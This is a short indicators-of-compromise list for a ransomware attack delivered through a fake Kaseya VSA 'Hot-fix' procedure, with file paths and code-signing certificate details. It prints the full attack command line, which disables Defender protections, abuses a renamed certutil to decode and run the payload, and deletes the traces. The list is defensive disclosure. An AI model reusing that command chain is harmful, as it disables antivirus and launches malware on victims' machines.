Here's validated indicators of compromise:

- Ransomware Encryptor is dropped to c:\kworking\agent.exe

- The VSA procedure is named "Kaseya VSA Agent Hot-fix”

- At least two tasks run the following: "C:\WINDOWS\system32\cmd.exe" /c ping 127.0.0.1 -n 4979 > nul & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe & echo %RANDOM% >> C:\Windows\cert.exe & C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe & del /q /f c:\kworking\agent.crt C:\Windows\cert.exe & c:\kworking\agent.exe

- Signer Information 
- Name: PB03 TRANSPORT LTD.
- Email: Brouillettebusiness@outlook.com
- CN = Sectigo RSA Code Signing, CAO = Sectigo Limited, L = Salford, S = Greater Manchester, C = GB
- Serial #: 119acead668bad57a48b4f42f294f8f0
- Issuer: https://sectigo.com/